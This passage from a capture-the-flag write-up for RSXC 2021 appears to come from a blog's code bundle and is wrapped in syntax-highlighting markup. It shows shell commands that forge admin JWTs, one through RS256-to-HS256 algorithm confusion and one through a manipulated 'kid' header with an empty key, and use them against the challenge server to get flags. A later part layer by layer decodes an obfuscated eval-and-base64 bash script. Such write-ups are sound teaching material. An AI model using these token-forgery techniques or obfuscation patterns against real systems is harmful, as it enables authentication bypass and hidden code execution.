juki@izone:~/Desktop/ctf/rsxc2021$ <span class="token function">curl</span> -s <span class="token string">'http://rsxc.no:20014/portal.php'</span> -H <span class="token string">"Cookie: <span class="token variable"><span class="token variable">$(</span><span class="token builtin class-name">echo</span> -n $TEMP14<span class="token variable">)</span></span> jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.gERmL-_S0FkZDAbIE6zrYSIP2MKc3Mrh5jxOWkM8Gyw"</span> <span class="token operator">|</span> <span class="token function">grep</span> -Eo <span class="token string">"RSXC&#123;.*&#125;"</span> <span class="token comment"># SET TAMPERED JWT AND GET FLAG</span>
RSXC<span class="token punctuation">&#123;</span>You_have_to_remember_to_limit_what_algorithms_are_allowed<span class="token punctuation">&#125;</span></code>`,Kr,mn,jm,hl,Pm,au,bn,uo,Hm,su,gn,ko,Am,nu,ho,fo,Xm,ba,qm,eu,vn,mo,Gm,tu,h,Bm,fl,$m,Qm,dl,Lm,Km,ml,a1,s1,bl,n1,e1,gl,t1,o1,ga,p1,l1,vl,i1,c1,_l,r1,u1,wl,k1,h1,ou,_n,MT=`<code class="language-shell">juki@izone:~/Desktop/ctf/rsxc2021/jwt_tool$ python3 jwt_tool.py eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6Imh0dHA6XC9cL2xvY2FsaG9zdFwvand0UlMyNTYua2V5LnB1YiJ9.eyJ1c2VybmFtZSI6InRlc3QifQ.xl3jDlNK0trxkNjEQC5cNxWzZzPGUgGaLIiKHWv6hf2WvEzuuZbTaLSiZNDavs7V7SijOYH1IFQ8vjS_qd2-XQtf4Lc_WR7slsNDlpib4zK7MKXFbzoOm7XQF8bTafl_CBGYB2GU587ZdTsv5FoUPWfe6_XXiHTpQkVZKs-TGs8HQUtF0lDQ0f72XBMtioMoj7BM5cxfoQNYf72UOqucrYmpN_IOjb0ViOBTbU_mpDbrzAYStjqIpmze4mjogQfk5POY1cU3WWZYHv5fmRgBn_dR58IMsedrIdnAsw98J8XSxALFr1DwLC7EVf6rriP_r-3dJJFtEhhTSPQiVZUtrfAZexR7Gw0eg6cdOCICexmAdYw-9TGczzC26Y9R51G-NOHpTPvhw_qU2uD86PQZznN3GpemxvQyMW7c85zs9zGJlJ7TSRs72EJEdeCo08UQ12uuIzIJ2S-WMmoBPcEaibKS3ct-gOGP73ShRfIHF95MHjOcj5B4KHDRApOtL1bLE4p6Hri4m_W6J3U8GaxNctp-QTiSoxYA1dLYWWG9B9vvNhCH_ZKzTshuiC-Qhg3y-0IPPgVcxMUkE7LpbSOdSqIZP0_FJ--Nd5Ebat1I7iJKSGnTVeUILOUBYSuyaG1w5wp1ghqIFk5xwS6sMbIm_tCEJlMgWmWgFyerjh3QaI8 -I -hc kid -hv <span class="token string">"portal.php"</span> -S hs256 -p <span class="token string">""</span> -pc username -pv admin -pk <span class="token punctuation">..</span>/jwtRS256.key.pub

        <span class="token punctuation"></span>   <span class="token punctuation"></span>        <span class="token punctuation"></span>         <span class="token punctuation"></span>          <span class="token punctuation"></span>                    <span class="token punctuation"></span>
   <span class="token punctuation"></span>__   <span class="token operator">|</span>   <span class="token operator">|</span>  <span class="token punctuation"></span>     <span class="token operator">|</span><span class="token punctuation"></span>__    __<span class="token operator">|</span> <span class="token punctuation"></span>__    __<span class="token operator">|</span>                    <span class="token operator">|</span>
         <span class="token operator">|</span>   <span class="token operator">|</span>   <span class="token punctuation"></span>    <span class="token operator">|</span>      <span class="token operator">|</span>          <span class="token operator">|</span>       <span class="token punctuation"></span>         <span class="token punctuation"></span>     <span class="token operator">|</span>
         <span class="token operator">|</span>        <span class="token punctuation"></span>   <span class="token operator">|</span>      <span class="token operator">|</span>          <span class="token operator">|</span>    __  <span class="token punctuation"></span>     __  <span class="token punctuation"></span>    <span class="token operator">|</span>
  <span class="token punctuation"></span>      <span class="token operator">|</span>      _     <span class="token operator">|</span>      <span class="token operator">|</span>          <span class="token operator">|</span>   <span class="token operator">|</span>     <span class="token operator">|</span>   <span class="token operator">|</span>     <span class="token operator">|</span>   <span class="token operator">|</span>
   <span class="token operator">|</span>     <span class="token operator">|</span>     / <span class="token punctuation"></span>    <span class="token operator">|</span>      <span class="token operator">|</span>          <span class="token operator">|</span>   <span class="token operator">|</span>     <span class="token operator">|</span>   <span class="token operator">|</span>     <span class="token operator">|</span>   <span class="token operator">|</span>
<span class="token punctuation"></span>        <span class="token operator">|</span>    /   <span class="token punctuation"></span>   <span class="token operator">|</span>      <span class="token operator">|</span>          <span class="token operator">|</span><span class="token punctuation"></span>        <span class="token operator">|</span><span class="token punctuation"></span>        <span class="token operator">|</span>   <span class="token operator">|</span>
 <span class="token punctuation"></span>______/ <span class="token punctuation"></span>__/     <span class="token punctuation"></span>__<span class="token operator">|</span>   <span class="token punctuation"></span>__<span class="token operator">|</span>      <span class="token punctuation"></span>__<span class="token operator">|</span> <span class="token punctuation"></span>______/  <span class="token punctuation"></span>______/ <span class="token punctuation"></span>__<span class="token operator">|</span>
 Version <span class="token number">2.2</span>.4                <span class="token punctuation"></span>______<span class="token operator">|</span>             @ticarpi

Original JWT:

jwttool_b369f60acd84aec98b34740db6882c06 - Tampered token - HMAC Signing:
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsImtpZCI6InBvcnRhbC5waHAifQ.eyJ1c2VybmFtZSI6ImFkbWluIn0.PbNF4szD3H-puzObv0p4MgXUudQSmvIuxmwjfhQYguQ</code>`,pu,wn,IT=`<code class="language-shell">juki@izone:~/Desktop/ctf/rsxc2021$ <span class="token assign-left variable">TEMP15</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span><span class="token function">curl</span> -s -i <span class="token string">'http://rsxc.no:20015/'</span> <span class="token operator">|</span> <span class="token function">grep</span> -Eo <span class="token string">"PHPSESSID=.*?;"</span><span class="token variable">)</span></span> <span class="token comment"># Get PHPSESSIONID</span>
juki@izone:~/Desktop/ctf/rsxc2021$ <span class="token function">curl</span> <span class="token string">'http://rsxc.no:20015/'</span> -H <span class="token string">"Cookie: <span class="token variable"><span class="token variable">$(</span><span class="token builtin class-name">echo</span> -n $TEMP15<span class="token variable">)</span></span>"</span> --data-raw <span class="token string">'username=test&amp;password=test'</span> <span class="token comment"># LOGIN</span>
juki@izone:~/Desktop/ctf/rsxc2021/jwt_tool$ <span class="token function">curl</span> -s -i <span class="token string">'http://rsxc.no:20015/portal.php'</span> -H <span class="token string">"Cookie: <span class="token variable"><span class="token variable">$(</span><span class="token builtin class-name">echo</span> -n $TEMP15<span class="token variable">)</span></span> jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsImtpZCI6InBvcnRhbC5waHAifQ.eyJ1c2VybmFtZSI6ImFkbWluIn0.PbNF4szD3H-puzObv0p4MgXUudQSmvIuxmwjfhQYguQ"</span> <span class="token operator">|</span> <span class="token function">grep</span> -Eo <span class="token string">"RSXC&#123;.*&#125;"</span> <span class="token comment"># SET TAMPERED JWT AND GET FLAG</span>
RSXC<span class="token punctuation">&#123;</span>Don't_let_others_decide_where_your_keys_are_located<span class="token punctuation">&#125;</span></code>`,lu,En,f1,El,d1,iu,Tn,bo,m1,cu,yn,go,b1,ru,vo,_o,g1,va,v1,uu,Vn,wo,_1,ku,Ca,w1,Tl,E1,T1,hu,xn,OT=`<code class="language-bash"><span class="token comment"># 16-challenge.sh</span>
<span class="token assign-left variable">gH4</span><span class="token operator">=</span><span class="token string">"Ed"</span><span class="token punctuation">;</span><span class="token assign-left variable">kM0</span><span class="token operator">=</span><span class="token string">"xSz"</span><span class="token punctuation">;</span><span class="token assign-left variable">c</span><span class="token operator">=</span><span class="token string">"ch"</span><span class="token punctuation">;</span><span class="token assign-left variable">L</span><span class="token operator">=</span><span class="token string">"4"</span><span class="token punctuation">;</span><span class="token assign-left variable">rQW</span><span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">;</span><span class="token assign-left variable">fE1</span><span class="token operator">=</span><span class="token string">"lQ"</span><span class="token punctuation">;</span><span class="token assign-left variable">s</span><span class="token operator">=</span><span class="token string">" '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
' | r"</span><span class="token punctuation">;</span><span class="token assign-left variable">HxJ</span><span class="token operator">=</span><span class="token string">"s"</span><span class="token punctuation">;</span><span class="token assign-left variable">Hc2</span><span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">;</span><span class="token assign-left variable">f</span><span class="token operator">=</span><span class="token string">"as"</span><span class="token punctuation">;</span><span class="token assign-left variable">kcE</span><span class="token operator">=</span><span class="token string">"pas"</span><span class="token punctuation">;</span><span class="token assign-left variable">cEf</span><span class="token operator">=</span><span class="token string">"ae"</span><span class="token punctuation">;</span><span class="token assign-left variable">d</span><span class="token operator">=</span><span class="token string">"o"</span><span class="token punctuation">;</span><span class="token assign-left variable">V9z</span><span class="token operator">=</span><span class="token string">"6"</span><span class="token punctuation">;</span><span class="token assign-left variable">P8c</span><span class="token operator">=</span><span class="token string">"if"</span><span class="token punctuation">;</span><span class="token assign-left variable">U</span><span class="token operator">=</span><span class="token string">" -d"</span><span class="token punctuation">;</span><span class="token assign-left variable">Jc</span><span class="token operator">=</span><span class="token string">"ef"</span><span class="token punctuation">;</span><span class="token assign-left variable">N0q</span><span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">;</span><span class="token assign-left variable">v</span><span class="token operator">=</span><span class="token string">"b"</span><span class="token punctuation">;</span><span class="token assign-left variable">w</span><span class="token operator">=</span><span class="token string">"e"</span><span class="token punctuation">;</span><span class="token assign-left variable">b</span><span class="token operator">=</span><span class="token string">"v |"</span><span class="token punctuation">;</span><span class="token assign-left variable">Tx</span><span class="token operator">=</span><span class="token string">"Eds"</span><span class="token punctuation">;</span><span class="token assign-left variable">xZp</span><span class="token operator">=</span><span class="token string">""</span>
<span class="token assign-left variable">x</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span><span class="token builtin class-name">echo</span> <span class="token string">"<span class="token variable">$Hc2</span><span class="token variable">$w</span><span class="token variable">$c</span><span class="token variable">$rQW</span><span class="token variable">$d</span><span class="token variable">$s</span><span class="token variable">$w</span><span class="token variable">$b</span><span class="token variable">$Hc2</span><span class="token variable">$v</span><span class="token variable">$xZp</span><span class="token variable">$f</span><span class="token variable">$w</span><span class="token variable">$V9z</span><span class="token variable">$rQW</span><span class="token variable">$L</span><span class="token variable">$U</span><span class="token variable">$xZp</span>"</span><span class="token variable">)</span></span>
<span class="token builtin class-name">echo</span> <span class="token variable">$x</span> <span class="token operator">|</span> base64
<span class="token comment">#x=$(eval "$Hc2$w$c$rQW$d$s$w$b$Hc2$v$xZp$f$w$V9z$rQW$L$U$xZp")</span>
<span class="token comment">#eval "$N0q$x$Hc2$rQW"</span></code>`,fu,Rn,FT=`<code class="language-shell">juki@izone:~/Desktop/ctf/rsxc2021$ <span class="token function">bash</span> <span class="token number">16</span>-challenge.sh <span class="token operator">|</span> base64 -d
<span class="token builtin class-name">echo</span> <span class="token string">'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 '</span> <span class="token operator">|</span> <span class="token function">rev</span> <span class="token operator">|</span>base64 -d</code>`,du,Da,y1,yl,V1,x1,mu,Un,zT=`<code class="language-shell">juki@izone:~/Desktop/ctf/rsxc2021$ <span class="token builtin class-name">echo</span> <span class="token string">'=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'</span> <span class="token operator">|</span> <span class="token function">rev</span> <span class="token operator">|</span> base64 -d
<span class="token assign-left variable">gH4</span><span class="token operator">=</span><span class="token string">"Ed"</span><span class="token punctuation">;</span><span class="token assign-left variable">kM0</span><span class="token operator">=</span><span class="token string">"xSz"</span><span class="token punctuation">;</span><span class="token assign-left variable">c</span><span class="token operator">=</span><span class="token string">"ch"</span><span class="token punctuation">;</span><span class="token assign-left variable">L</span><span class="token operator">=</span><span class="token string">"4"</span><span class="token punctuation">;</span><span class="token assign-left variable">rQW</span><span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">;</span><span class="token assign-left variable">fE1</span><span class="token operator">=</span><span class="token string">"lQ"</span><span class="token punctuation">;</span><span class="token assign-left variable">s</span><span class="token operator">=</span><span class="token string">" 'Kg2cgwHIk1CI0YTZzFmYgwHIis0ZyM2Z3hUS3FzQJlXMDl0aohUZndHSJhmQEpleRJTT4VlaOJTSt5kMRRkWysGVOJTWE5kMR1mTiEWY3RWbuF2dmFGJiISY3J3ZhRiIzcmaONTUE5kMN1mT41kaNpXSq5EakR1T6VkeNJSYhdHZt5WY3ZWYkIiaZJza61kMRRkTykVbOBTW65UMFpmTwMGVPpXWE5EMZJSY3J3ZhRiIzsmeNJTVUlVMJ1mT10kaNp3aU5kMZpWTxMGVOhmViE2dydWYkIieZRkT51EVPFTRy4kMVRlWyU0VOVTWU9keJpXT0UlIhdncnFGJioXVH5ENVRkTysmeOlXV61kenRlTx0ERPNzYE5EaWRlTz0UbONTUq1kMrpmT10kaOBTUq5EbaRkT6lkeNJSYhdHZt5WY3ZWYkICVOBTU65keNRVTxsGVOxmU6llMVRlT6lkaZpXUy00aORVTxklaOlmWq5EMR1mT1UlaOJTUq50aapWTyEkeORTW65EMRpmTqpFVNpXS61kIhF2dk1mbhdnZhRiIUl1MrpXT41kaNJTSt5UNNpmTwElaO1mWE5kMjRlT4lFRONza61kMRRkTyEkeOVTTq5UMFdlTppFVPpXS61UNVpmTykEVONTVUlVMBpXTyElaNp3aU5EakpmTxUVbOhmVU9kMrpXT51ERPFTQ61EbSR0TxElaOVzYq1UMNpXT0UFVOp3Z650MRRVWxUleOpmW65EMJpmT1kFVPpXWE5EMZRlWyEleNlXTq1kMVRkTwMmeNpXRU5UNVRlWw0UbOFTV61UeJJTTwMGRPNTU65EbKpnTyUkaOpmWq5kMZ1WTykFVOpXUq5kIhF2dk1mbhdnZhRiIU5kMBpXT10EROJTRq5UMNJSY3J3ZhRiI61keNFTWiE2dydWYkIieVpXT10ERPpXWq5kIhF2dk1mbhdnZhRiIq1keJpmT31keOpXTq5UeNR0T6NmeNFTWiE2dydWYkIiejpXTiEWY3RWbuF2dmFGJiQkTy0kaOdXTU1keNpmTiEWY3RWbuF2dmFGJiomTyUlaOhXTE5keNpXTy0keNJTU61UMZJSY3J3ZhRiI6VleNVTT61keJpmTw0EROJTTq5kMZRVTykkeNBTWE5keNpXTiEWY3RWbuF2dmFGJiISY3J3ZhRiI6lleNJSYhdHZt5WY3ZWYkIiaaJSYhdHZt5WY3ZWYkISbOxmWUpVeNpmT0MmeNNTS65UbKpmW5VkMNd3YE50MRpnT0klIhdncnFGJikXTt5UejRlTz0kaOdXSEV2dBlnYv50VaJCIvh2YltTeZ1TYhdHZt5WY3ZWY7QUT9E2dydWY
' | r"</span><span class="token punctuation">;</span><span class="token assign-left variable">HxJ</span><span class="token operator">=</span><span class="token string">"s"</span><span class="token punctuation">;</span><span class="token assign-left variable">Hc2</span><span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">;</span><span class="token assign-left variable">f</span><span class="token operator">=</span><span class="token string">"as"</span><span class="token punctuation">;</span><span class="token assign-left variable">kcE</span><span class="token operator">=</span><span class="token string">"pas"</span><span class="token punctuation">;</span><span class="token assign-left variable">cEf</span><span class="token operator">=</span><span class="token string">"ae"</span><span class="token punctuation">;</span><span class="token assign-left variable">d</span><span class="token operator">=</span><span class="token string">"o"</span><span class="token punctuation">;</span><span class="token assign-left variable">V9z</span><span class="token operator">=</span><span class="token string">"6"</span><span class="token punctuation">;</span><span class="token assign-left variable">P8c</span><span class="token operator">=</span><span class="token string">"if"</span><span class="token punctuation">;</span><span class="token assign-left variable">U</span><span class="token operator">=</span><span class="token string">" -d"</span><span class="token punctuation">;</span><span class="token assign-left variable">Jc</span><span class="token operator">=</span><span class="token string">"ef"</span><span class="token punctuation">;</span><span class="token assign-left variable">N0q</span><span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">;</span><span class="token assign-left variable">v</span><span class="token operator">=</span><span class="token string">"b"</span><span class="token punctuation">;</span><span class="token assign-left variable">w</span><span class="token operator">=</span><span class="token string">"e"</span><span class="token punctuation">;</span><span class="token assign-left variable">b</span><span class="token operator">=</span><span class="token string">"v |"</span><span class="token punctuation">;</span><span class="token assign-left variable">Tx</span><span class="token operator">=</span><span class="token string">"Eds"</span><span class="token punctuation">;</span><span class="token assign-left variable">xZp</span><span class="token operator">=</span><span class="token string">""</span>
<span class="token assign-left variable">x</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span><span class="token builtin class-name">eval</span> <span class="token string">"<span class="token variable">$Hc2</span><span class="token variable">$w</span><span class="token variable">$c</span><span class="token variable">$rQW</span><span class="token variable">$d</span><span class="token variable">$s</span><span class="token variable">$w</span><span class="token variable">$b</span><span class="token variable">$Hc2</span><span class="token variable">$v</span><span class="token variable">$xZp</span><span class="token variable">$f</span><span class="token variable">$w</span><span class="token variable">$V9z</span><span class="token variable">$rQW</span><span class="token variable">$L</span><span class="token variable">$U</span><span class="token variable">$xZp</span>"</span><span class="token variable">)</span></span>
